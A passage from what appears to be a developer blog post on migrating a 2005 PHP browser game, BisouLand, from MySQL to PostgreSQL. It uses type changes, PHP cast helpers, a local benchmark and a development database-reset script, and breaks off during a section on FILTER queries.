  <td><strong>SQL Syntax</strong></td>
  <td></td>
</tr>
<tr>
  <td><code>LIMIT 5 OFFSET 0</code></td>
  <td><code>LIMIT 0, 5</code></td>
</tr>
<tr>
  <td><code>ON CONFLICT (id) DO UPDATE</code></td>
  <td><code>ON DUPLICATE KEY UPDATE</code></td>
</tr>
<tr>
  <td><code>extract(epoch from now())::integer</code></td>
  <td><code>UNIX_TIMESTAMP()</code></td>
</tr>
</tbody>
</table>

<p>For example in <code>evo.php</code>:</p>

<pre><code class="diff">  // On passe √† une nouvelle construction si disponible.
- $stmt = $pdo-&gt;prepare('SELECT id, duree, type, cout FROM liste WHERE auteur = :auteur AND classe = :classe ORDER BY id LIMIT 0,1');
+ $stmt = $pdo-&gt;prepare('SELECT id, duree, type, cout FROM liste WHERE auteur = :auteur AND classe = :classe ORDER BY id LIMIT 1 OFFSET 0');
  $stmt-&gt;execute(['auteur' =&gt; $id, 'classe' =&gt; $classeCancel]);
</code></pre>

<p>And in <code>schema.sql</code>:</p>

<pre><code class="diff">  -- Messages table
  -- Field order MUST match INSERT statements in fctIndex.php::AdminMP()
  CREATE TABLE IF NOT EXISTS messages (
-     id INT PRIMARY KEY AUTO_INCREMENT,  -- Auto-increment
-     posteur INT NOT NULL,               -- Matches $source/$expediteur from INSERT
-     destin INT NOT NULL,                -- Matches $cible from INSERT
+     id SERIAL PRIMARY KEY,              -- Auto-increment
+     posteur INTEGER NOT NULL,           -- Matches $source/$expediteur from INSERT
+     destin INTEGER NOT NULL,            -- Matches $cible from INSERT
      message TEXT NOT NULL,              -- Matches $message from INSERT
-     timestamp INT NOT NULL,             -- Matches $timer/time() from INSERT
-     statut TINYINT(1) DEFAULT 0,        -- Matches '0'/$lu from INSERT
+     timestamp INTEGER NOT NULL,         -- Matches $timer/time() from INSERT
+     statut SMALLINT DEFAULT 0,          -- Matches '0'/$lu from INSERT
      titre VARCHAR(100) NOT NULL         -- Matches $titre/$objet from INSERT
  );
</code></pre>

<p>But PostgreSQL is much more interesting than that.</p>

<h2 id="types">Types</h2>

<h3 id="boolean">Boolean</h3>

<p>Some of the MySQL <code>TINYINT</code> actually were boolean, and as it turns out,
PostgreSQL does have a <code>BOOLEAN</code> type:</p>

<pre><code class="diff">  -- Messages table
  -- Field order MUST match INSERT statements in fctIndex.php::AdminMP()
  CREATE TABLE IF NOT EXISTS messages (
      id SERIAL PRIMARY KEY,              -- Auto-increment
      posteur INTEGER NOT NULL,           -- Matches $source/$expediteur from INSERT
      destin INTEGER NOT NULL,            -- Matches $cible from INSERT
      message TEXT NOT NULL,              -- Matches $message from INSERT
      timestamp INTEGER NOT NULL,         -- Matches $timer/time() from INSERT
-     statut SMALLINT DEFAULT 0,          -- Matches '0'/$lu from INSERT
+     statut BOOLEAN DEFAULT FALSE,       -- (FALSE=unread, TRUE=read)
      titre VARCHAR(100) NOT NULL         -- Matches $titre/$objet from INSERT
  );
</code></pre>

<p>Which means we get a PHP <code>bool</code> upon selecting these:</p>

<pre><code class="diff">- &lt;td&gt;&lt;?php if (0 == $donnees['statut']) {
+ &lt;td&gt;&lt;?php if (false === $donnees['statut']) {
      echo '&lt;a class="bulle" style="cursor: default;" onclick="return false;" href=""&gt;&lt;img src="images/newmess.png" alt="Message non lu" title="" /&gt;&lt;span&gt;Message &gt;
  }?&gt;&lt;/td&gt;
</code></pre>

<p>But there is a catch:
when constructing a query, PDO will not convert PHP bool to PostgreSQL BOOLEAN!</p>

<p>We have to do the PHP bool to PHP string conversion ourselves:</p>

<pre><code class="php">&lt;?php

namespace Bl\Infrastructure\Pg;

class CastToPgBoolean
{
    /**
     * PostgreSQL's BOOLEAN fields are strings with for values:
     * - `true`, `t`, `TRUE`
     * - `false`, `f`, `FALSE`
     */
    public function from(bool $value): string
    {
        return $value ? 'TRUE' : 'FALSE';
    }
}
</code></pre>

<p>And do that before calling PDO:</p>

<pre><code class="diff">  $stmt = $pdo-&gt;prepare(
      'INSERT INTO membres (pseudo, mdp, confirmation, timestamp, lastconnect, amour)'
      .' VALUES (:pseudo, :mdp, :confirmation, :timestamp, :lastconnect, :amour)',
  );
- $stmt-&gt;execute(['pseudo' =&gt; $pseudo, 'mdp' =&gt; $hmdp, 'confirmation' =&gt; 1, 'timestamp' =&gt; time(), 'lastconnect' =&gt; time(), 'amour' =&gt; 300]);
+ $stmt-&gt;execute(['pseudo' =&gt; $pseudo, 'mdp' =&gt; $hmdp, 'confirmation' =&gt; $castToPgBoolean-&gt;from(true), 'amour' =&gt; 300]);
</code></pre>

<p>If we are not binding parameters, but instead using plain SQL queries, then we can use <code>TRUE</code> and <code>FALSE</code> as follow:</p>

<pre><code class="diff">  // On supprime les unit√©s.
- $stmt = $pdo-&gt;prepare('UPDATE membres SET smack = :smack, baiser = :baiser, pelle = :pelle, bloque = 0 WHERE id = :id');
+ $stmt = $pdo-&gt;prepare('UPDATE membres SET smack = :smack, baiser = :baiser, pelle = :pelle, bloque = FALSE WHERE id = :id');
  $stmt-&gt;execute(['smack' =&gt; $AttSmack, 'baiser' =&gt; $AttBaiser, 'pelle' =&gt; $AttPelle, 'id' =&gt; $idAuteur]);
</code></pre>

<h3 id="timestamp">Timestamp</h3>

<p>In BisouLand, time and intervals are an essential component of the game:
when blowing a kiss, these kisses will take some time to travel to the target,
and then as much time to come back.</p>

<p>In 2005 eXtreme Legacy fashion, time was handled as a UNIX timestamp,
the number of seconds since January the 1st 1970.</p>

<p>Since PostgreSQL has a <code>TIMESTAMPTZ</code>, which is an actual ISO 8601 date string,
with timezone information, we can take the opportunity to modernise the code:</p>

<pre><code class="diff">  -- Attack log table
  -- Logs completed attacks for rate limiting, INSERT in attaque.php:16, checked in action.php:74
  CREATE TABLE IF NOT EXISTS logatt (
      id SERIAL PRIMARY KEY,              -- Log entry ID
      auteur INTEGER NOT NULL,            -- Attacker user ID, checked for rate limiting
      cible INTEGER NOT NULL,             -- Target user ID
-     timestamp INTEGER NOT NULL          -- Attack completion time, used for 12-hour limit check
+     timestamp TIMESTAMPTZ NOT NULL      -- Attack completion time, used for 12-hour limit check
  );
</code></pre>

<p>We take the opportunity to use PostgreSQL <code>CURRENT_TIMESTAMP</code> function when possible,
and even do INTERVAL calculations:</p>

<pre><code class="diff">- $stmt = $pdo-&gt;prepare('SELECT COUNT(*) AS nb_att FROM logatt WHERE auteur = :auteur AND cible = :cible AND timestamp &gt;= :timestamp');
- $stmt-&gt;execute(['auteur' =&gt; $id, 'cible' =&gt; $cible, 'timestamp' =&gt; time() - 43200]);
+ $stmt = $pdo-&gt;prepare("SELECT COUNT(*) AS nb_att FROM logatt WHERE auteur = :auteur AND cible = :cible AND timestamp &gt;= CURRENT_TIMESTAMP - INTERVAL '12 hours'");
+ $stmt-&gt;execute(['auteur' =&gt; $id, 'cible' =&gt; $cible]);
</code></pre>

<p>I gotta admit, I'm not ready yet to convert all the UNIX timestamp in the code to <code>DateTime</code> objects,
so we'll have to convert them from PHP int to PHP string in ISO 8601 format:</p>

<pre><code class="php">&lt;?php

namespace Bl\Infrastructure\Pg;

class CastToPgTimestamptz
{
    /**
     * PostgreSQL's TIMESTAMPTZ fields are strings in (sort of) ISO 8601 date format:
     * - '2025-11-20T16:45:03.336548+00:00' (fully ISO 8601 compliant)
     * - '2025-11-20 16:45:03+00'
     * - '2025-11-20 16:45:03+00:00'
     * - '2025-11-20 16:45:03.336548+00'
     * - '2025-11-20 16:45:03.336548+00:00'
     */
    public function fromUnixTimestamp(int $unixTimestamp): string
    {
        return new \DateTimeImmutable("@{$unixTimestamp}")-&gt;format('Y-m-d\TH:i:s.uP');
    }
}
</code></pre>

<p>And:</p>

<pre><code class="php">&lt;?php

namespace Bl\Infrastructure\Pg;

class CastToUnixTimestamp
{
    /**
     * PostgreSQL's TIMESTAMPTZ fields are strings in (sort of) ISO 8601 date format:
     * - '2025-11-20T16:45:03.336548+00:00' (fully ISO 8601 compliant)
     * - '2025-11-20 16:45:03+00'
     * - '2025-11-20 16:45:03+00:00'
     * - '2025-11-20 16:45:03.336548+00'
     * - '2025-11-20 16:45:03.336548+00:00'
     */
    public function fromPgTimestamptz(string $timestamptz): int
    {
        return new \DateTimeImmutable($timestamptz)-&gt;getTimestamp();
    }
}
</code></pre>

<p>So when interracting with PDO, we do:</p>

<pre><code class="diff">- $stmt = $pdo-&gt;prepare('INSERT INTO attaque VALUES (:auteur, :cible, :finaller, :finretour, 0)');
- $stmt-&gt;execute(['auteur' =&gt; $id, 'cible' =&gt; $cible, 'finaller' =&gt; time() + $duree, 'finretour' =&gt; time() + 2 * $duree]);
+ $stmt = $pdo-&gt;prepare('INSERT INTO attaque (auteur, cible, finaller, finretour, etat) VALUES (:auteur, :cible, :finaller, :finretour, 0)');
+ $stmt-&gt;execute(['auteur' =&gt; $id, 'cible' =&gt; $cible, 'finaller' =&gt; $castToPgTimestamptz-&gt;fromUnixTimestamp(time() + $duree), 'finretour' =&gt; $castToPgTimestamptz-&gt;fromUnixTimestamp(time() + 2 * $duree)]);
</code></pre>

<h3 id="uuid">UUID</h3>

<p>I love UUIDs. Don't ask me why, I just do.</p>

<p>So it made total sense for me to add something I loved in the love game that is BisouLand:</p>

<pre><code class="diff">  -- Evolution/construction queue
  -- Active construction tasks, INSERT in index.php:427, SELECT/DELETE in index.php:392-409
  CREATE TABLE IF NOT EXISTS evolution (
-     id SERIAL PRIMARY KEY,              -- Task ID for deletion when complete
+     id UUID PRIMARY KEY,                -- Task ID (UUIDv7) for deletion when complete
      timestamp TIMESTAMPTZ NOT NULL,     -- Completion time, checked against time() in index.php:392
      classe INTEGER NOT NULL,            -- Object class/category for construction
      type INTEGER NOT NULL,              -- Specific object type within class
-     auteur INTEGER NOT NULL,            -- User ID who initiated construction, from $id2
+     auteur UUID NOT NULL,               -- User ID (foreign key to membres.id) who initiated construction
      cout BIGINT NOT NULL                -- Cost of the construction task
  );
</code></pre>

<p>I've been using UUID v4 for a while, which are random generated,
but there's a new kid in town: v7, which is still random,
but storable by their creation time as the first 48 bits are a UNIX Epoch timestamp.</p>

<p>Of course, I want the client to generate the UUID, not the database,
and this can be done thanks to the <a href="https://symfony.com/doc/current/components/uid.html">Symfony Uid component</a>:</p>

<pre><code class="diff">+ use Symfony\Uid\Uuid;

  // On indique que l'attaque a eu lieu.
- $stmt = $pdo-&gt;prepare('INSERT INTO logatt VALUES(:auteur, :cible, :timestamp)');
- $stmt-&gt;execute(['auteur' =&gt; $idAuteur, 'cible' =&gt; $idCible, 'timestamp' =&gt; $finaller]);
+ $stmt = $pdo-&gt;prepare('INSERT INTO logatt (id, auteur, cible, timestamp) VALUES(:id, :auteur, :cible, :timestamp)');
+ $stmt-&gt;execute(['id' =&gt; Uuid::v7(), 'auteur' =&gt; $idAuteur, 'cible' =&gt; $idCible, 'timestamp' =&gt; $finaller]);
</code></pre>

<p>Oh but hang on, how did we get a Symfony 8 feature in a 2005 LAMP app you ask?</p>

<p>Well it required some tricks, such as renaming <code>index.php</code> to <code>app.php</code>,
and in <code>index.php</code> create the following front controller:</p>

<pre><code class="php">&lt;?php

declare(strict_types=1);

require __DIR__.'/../vendor/autoload.php';

try {
    require __DIR__.'/../phpincludes/app.php';
} catch (Throwable $throwable) {
    http_response_code(500);
    error_log($throwable-&gt;getMessage());
    echo 'An error occurred';
}
</code></pre>

<p>With that, we can now use composer to get third party libraries, see the <code>composer.json</code>:</p>

<pre><code class="json">{
    "name": "bl/monolith",
    "description": "The original BisouLand codebase",
    "type": "project",
    "license": "Apache-2.0",
    "require": {
        "php": "&gt;=8.5",
        "ext-curl": "*",
        "symfony/uid": "^8.0@rc"
    },
    "autoload": {
        "psr-4": {
            "Bl\\": "src/"
        },
        "files": [
            "phpincludes/bd.php",
            "phpincludes/cast_to_pg_boolean.php",
            "phpincludes/cast_to_unix_timestamp.php",
            "phpincludes/cast_to_pg_timestamptz.php",
            "phpincludes/fctIndex.php"
        ]
    },
    "config": {
        "bump-after-update": true,
        "sort-packages": true
    }
}
</code></pre>

<h2 id="vanity-benchmark">Vanity Benchmark</h2>

<p>Surely, switching from MySQL to PostgreSQL will bring us massive performance boosts, right? Right??</p>

<p>Let's find out with some vanity benchmarks:</p>

<pre><code class="bash"># Start fresh
cd apps/monolith
make app-init

BENCH_USER="BisouTest_bench"
BENCH_PASS="SuperSecret123"

# Sign up
curl -X POST 'http://localhost:43000/inscription.html' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d "Ipseudo=${BENCH_USER}&amp;Imdp=${BENCH_PASS}&amp;Imdp2=${BENCH_PASS}&amp;inscription=S%27inscrire"

# Log in
BENCH_COOKIE=$(curl -X POST 'http://localhost:43000/redirect.php' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d "pseudo=${BENCH_USER}&amp;mdp=${BENCH_PASS}&amp;connexion=Se+connecter" \
  -i -s | grep -i 'set-cookie: PHPSESSID' | sed 's/.*PHPSESSID=\([^;]*\).*/\1/' | tr -d '\r')

# Test load homepage (not signed in)
ab -l -q -k -c 50 -n 10000 http://localhost:43000/ \
    | grep -E "Complete requests|Failed requests|Exception|Requests per second|Time per request.*across"

# Test load Brain page (signed in)
ab -l -q -k -c 50 -n 10000 -C "PHPSESSID=$BENCH_COOKIE" http://localhost:43000/cerveau.html \
    | grep -E "Complete requests|Failed requests|Exception|Requests per second|Time per request.*across"
</code></pre>

<p>We execute this before the migration (I've kindly upgraded to MySQL 8),
and after the migration to PostgreSQL.</p>

<p>On my MacBook M4 (with Docker), the results are as follow:</p>

<ul>
<li>Homepage (Visitor - Not Logged In):

<ul>
<li>Requests per second (mean): from <code>1503</code> to <code>100</code></li>
<li>Time per request (ms, mean, across all concurrent requests): from <code>0.665</code> to <code>9.943</code></li>
</ul></li>
<li>Brain Page (Logged In User):

<ul>
<li>Requests per second (mean): from <code>1133</code> to <code>96</code></li>
<li>Time per request (ms, mean, across all concurrent requests): from <code>0.883</code> to <code>10.348</code></li>
</ul></li>
</ul>

<p><strong>üö® Performance degradation: 90% slower than MySQL üôÄ</strong></p>

<p>How is that possible?? My core beliefs are now completly shattered!!!!111oneoneeleven</p>

<p>Unless... Unless we've missed one important configuration step:</p>

<pre><code class="php">&lt;?php

function bd_connect()
{
    static $pdo = null;

    if (null === $pdo) {
        $dsn = 'pgsql:host='.DATABASE_HOST.';port='.DATABASE_PORT.';dbname='.DATABASE_NAME;
        $options = [
            PDO::ATTR_ERRMODE =&gt; PDO::ERRMODE_EXCEPTION,
            PDO::ATTR_DEFAULT_FETCH_MODE =&gt; PDO::FETCH_ASSOC,
            PDO::ATTR_EMULATE_PREPARES =&gt; false,
            // Don't forget to set persistent connections!
            PDO::ATTR_PERSISTENT =&gt; true,
        ];
        $pdo = new PDO($dsn, DATABASE_USER, DATABASE_PASSWORD, $options);
    }

    return $pdo;
}
</code></pre>

<p>And indeed, we had forgotten to enable persistent connections.</p>

<p>As it turns out, the overhead of setting a new connection with PostgreSQL is quite consequential.</p>

<p>Let's re-run our tests (we make sure MySQL also gets persistent connection):</p>

<ul>
<li>Homepage (Visitor - Not Logged In):

<ul>
<li>Requests per second (mean): from <code>1683.86</code> to <code>1905.43</code></li>
<li>Time per request (ms, mean, across all concurrent requests): from <code>0.594</code> to <code>0.525</code></li>
</ul></li>
<li>Brain Page (Logged In User):

<ul>
<li>Requests per second (mean): from <code>1309.55</code> to <code>1828.19</code></li>
<li>Time per request (ms, mean, across all concurrent requests): from <code>0.764</code> to <code>0.547</code></li>
</ul></li>
</ul>

<p>Phew, my mid-life crisis is postponed üòå. PostgreSQL <strong>is</strong> after all faster than MySQL:</p>

<ul>
<li>Homepage: +13.1% improvement</li>
<li>Brain Page: +39.6% improvement</li>
</ul>

<p>It's great to see that now on the logged in pages,
we get the same speed as on on the not logged in ones.</p>

<h2 id="database-reset">Database Reset</h2>

<p>With the persistent connection, it's going to be harder to drop the database,
to recreate it. We'll need to first terminate active connections.</p>

<p>Once the database has been dropped, created and the schema loaded,
we also need to restart PostgreSQL to clear the connection pool:</p>

<pre><code class="bash">#!/usr/bin/env bash
# File: /apps/monolith/bin/db-reset.sh
# ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
# Database reset:
# * drops the database
# * then recreates it
# * and finally loads the schema
#
# Intended for development and testing purposes.
# ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ

_BIN_DIR="$(dirname "$(readlink -f "${BASH_SOURCE[0]:-$0}")")"
_ROOT_DIR="$(realpath "${_BIN_DIR}/..")"
cd "${_ROOT_DIR}"

# ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
# Loading database config through environment variables.
# `set -a` enables exportation of env vars, while `set +a` disables it.
# Passing PostgreSQL password via command line arguments is insecure,
# so using `PGPASSWORD` instead.
# ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
set -a; source .env; set +a

export PGPASSWORD="${DATABASE_PASSWORD}"

# ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
# Reset the database, through Docker containers.
# ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
echo '  // üîå Terminating active connections...'
echo ''
docker compose exec -e PGPASSWORD db psql \
    -U ${DATABASE_USER} \
    -d postgres \
    -c "SELECT pg_terminate_backend(pid) FROM pg_stat_activity WHERE datname = '${DATABASE_NAME}' AND pid &lt;&gt; pg_backend_pid();" \
    &gt; /dev/null 2&gt;&amp;1

echo '  // üóëÔ∏è Dropping database...'
echo ''
docker compose exec -e PGPASSWORD db psql \
    -U ${DATABASE_USER} \
    -d postgres \
    -c "DROP DATABASE IF EXISTS ${DATABASE_NAME};" \
    &gt; /dev/null 2&gt;&amp;1

echo '  // üÜï Creating database...'
echo ''
docker compose exec -e PGPASSWORD db psql \
    -U ${DATABASE_USER} \
    -d postgres \
    -c "CREATE DATABASE ${DATABASE_NAME};" \
    &gt; /dev/null 2&gt;&amp;1

echo '  // üìã Loading schema.sql...'
echo ''
docker compose exec -T -e PGPASSWORD db psql \
    -U ${DATABASE_USER} \
    -d ${DATABASE_NAME} \
    &gt; /dev/null 2&gt;&amp;1 \
    &lt; schema.sql

echo '  // üîÑ Restarting web container to clear connection pool...'
echo ''
docker compose restart web &gt; /dev/null 2&gt;&amp;1

echo '  [OK] Database reset'
</code></pre>

<h2 id="conclusion">Conclusion</h2>

<p>There are actually some other types I've taken advantage of,
like INET and ENUM. But there's not much to say about those apart from
"look, I've replaced <code>attaque.etat SMALLINT (0,1,2)</code> with
<code>attack_state ENUM ('going_to_target', 'coming_back', 'cancelled')</code>":</p>

<pre><code class="diff">+ -- Blown kiss state ENUM type
+ CREATE TYPE blown_kiss_state AS ENUM ('EnRoute', 'ComingBack', 'CalledOff');

  -- Attack table
  -- Active attacks in progress, managed throughout attaque.php and action.php
  CREATE TABLE IF NOT EXISTS attaque (
      auteur UUID NOT NULL,               -- Attacker user ID (foreign key to membres.id), set bloque=1 during attack
      cible UUID NOT NULL,                -- Target user ID (foreign key to membres.id)
      finaller TIMESTAMPTZ NOT NULL,      -- Attack arrival timestamp (when units reach target)
      finretour TIMESTAMPTZ NOT NULL,     -- Return timestamp (when units return home)
-     etat SMALLINT NOT NULL DEFAULT 0,   -- Attack state: 0=going_to_target, 1=coming_back, 2=cancelled
+     state blown_kiss_state NOT NULL DEFAULT 'EnRoute',  -- Blown kiss state ENUM
      butin BIGINT DEFAULT 0              -- Loot gained from attack, set after battle
  );
</code></pre>

<p>I've taken the ENUM opportunity to also introduce a PHP enum:</p>

<pre><code class="php">&lt;?php

declare(strict_types=1);

namespace Bl\Domain\KissBlowing;

/**
 * Blown kiss state enum matching PostgreSQL blown_kiss_state type.
 *
 * Represents the three possible states of a blown kiss mission:
 * - EnRoute: Kiss units are traveling to the target
 * - ComingBack: Mission completed, units returning with loot
 * - CalledOff: Mission was cancelled by the player
 */
enum BlownKissState: string
{
    case EnRoute = 'EnRoute';
    case ComingBack = 'ComingBack';
    case CalledOff = 'CalledOff';
}
</code></pre>

<p>Which made some conditions easier to understand:</p>

<pre><code class="diff">  // // On r√©cup√®re les infos sur le joueur que l'on attaque.
- $stmt = $pdo-&gt;prepare('SELECT cible, finaller, finretour, butin, etat FROM attaque WHERE auteur = :auteur');
+ $stmt = $pdo-&gt;prepare('SELECT cible, finaller, finretour, butin, state FROM attaque WHERE auteur = :auteur');
  $stmt-&gt;execute(['auteur' =&gt; $id]);

  if ($donnees_info = $stmt-&gt;fetch()) {
      $stmt2 = $pdo-&gt;prepare('SELECT pseudo, nuage, position FROM membres WHERE id = :id');
      $stmt2-&gt;execute(['id' =&gt; $donnees_info['cible']]);
      $donnees_info2 = $stmt2-&gt;fetch();
      $pseudoCible = $donnees_info2['pseudo'];
      $nuageCible = $donnees_info2['nuage'];
      $positionCible = $donnees_info2['position'];
      $finAll = $castToUnixTimestamp-&gt;fromPgTimestamptz($donnees_info['finaller']);
      $finRet = $castToUnixTimestamp-&gt;fromPgTimestamptz($donnees_info['finretour']);
      $butinPris = $donnees_info['butin'];
-     $etat = $donnees_info['etat'];
+     $state = BlownKissState::from($donnees_info['state']);

-     if (isset($_POST['cancelAttaque']) &amp;&amp; 0 === $etat) {  
+     if (isset($_POST['cancelAttaque']) &amp;&amp; BlownKissState::EnRoute === $state) {
          $finRet = (2 * time() + $finRet - 2 * $finAll);
          $stmt3 = $pdo-&gt;prepare("UPDATE attaque SET state = 'CalledOff', finretour = :finretour WHERE auteur = :auteur");
          $stmt3-&gt;execute(['finretour' =&gt; $castToPgTimestamptz-&gt;fromUnixTimestamp($finRet), 'auteur' =&gt; $id]);
          AdminMP($donnees_info['cible'], 'Attaque annul√©e', "{$pseudo} a annul√© son attaque.
                          Tu n'es plus en danger.");
-         $etat = 2; // Update local variable to reflect the change
+         $state = BlownKissState::CalledOff; // Update local variable to reflect the change
      }

-     if (0 === $etat) {  
+     if (BlownKissState::EnRoute === $state) {
  ?&gt;
  Tu vas tenter d'embrasser &lt;strong&gt;&lt;?php echo $pseudoCible; ?&gt;&lt;/strong&gt; sur le nuage &lt;strong&gt;&lt;?php echo $nuageCible; ?&gt;&lt;/strong&gt;
</code></pre>

<p>So yeah. There it is.</p>

<p>The eXtreme Legacy (2005 LAMP) app is now migrated from MySQL to PostgreSQL.</p>

<p>It takes advantages of the native PostgreSQL types, such as BOOLEAN, ENUM, INET,
TIMESTAMPTZ and UUID, as well as getting a 13% performance boost in the process.</p>

<p>I guess it's time to stop calling it a LAMP app (how about a LAPP app?).</p>

<blockquote>
  <p>‚ÅâÔ∏è What do you mean, "there's a big security vulnerability"?</p>
</blockquote>

<h2 id="bonus-improvements">Bonus Improvements</h2>

<p>Still not convinced PostgreSQL is the superior database? Let me change your mind.</p>

<p>FYI, this is after doing the vanity benchmarks, so expect further speed gains.</p>

<h3 id="filter%3A-one-query%2C-multiple-count">FILTER: One query, multiple COUNT</h3>

<p>BisouLand has a Statistics page proudly displaying how many players it has:</p>

<pre><code class="php">$retour = $pdo-&gt;query('SELECT SUM( amour ) AS nb FROM membres WHERE confirmation = TRUE');
$pointsAmourTotal = $retour-&gt;fetchColumn();
$retour = $pdo-&gt;query("SELECT COUNT(*) AS nb FROM membres WHERE confirmation=TRUE AND lastconnect &gt;= CURRENT_TIMESTAMP - INTERVAL '5 minutes'");
$connectCinq = $retour-&gt;fetchColumn();
$retour = $pdo-&gt;query("SELECT COUNT(*) AS nb FROM membres WHERE confirmation=TRUE AND lastconnect &gt;= CURRENT_TIMESTAMP - INTERVAL '1 hour'");
$connectHeure = $retour-&gt;fetchColumn();
$retour = $pdo-&gt;query("SELECT COUNT(*) AS nb FROM membres WHERE confirmation=TRUE AND lastconnect &gt;= CURRENT_TIMESTAMP - INTERVAL '12 hours'");
$connectMid = $retour-&gt;fetchColumn();
$retour = $pdo-&gt;query("SELECT COUNT(*) AS nb FROM membres WHERE confirmation=TRUE AND lastconnect &gt;= CURRENT_TIMESTAMP - INTERVAL '24 hours'");
$connectJour = $retour-&gt;fetchColumn();
$retour = $pdo-&gt;query("SELECT COUNT(*) AS nb FROM membres WHERE confirmation=TRUE AND lastconnect &gt;= CURRENT_TIMESTAMP - INTERVAL '48 hours'");
$connect2Jour = $retour-&gt;fetchColumn();
$retour = $pdo-&gt;query("SELECT COUNT(*) AS nb FROM membres WHERE confirmation=TRUE AND lastconnect &gt;= CURRENT_TIMESTAMP - INTERVAL '7 days'");
$connectSemaine = $retour-&gt;fetchColumn();
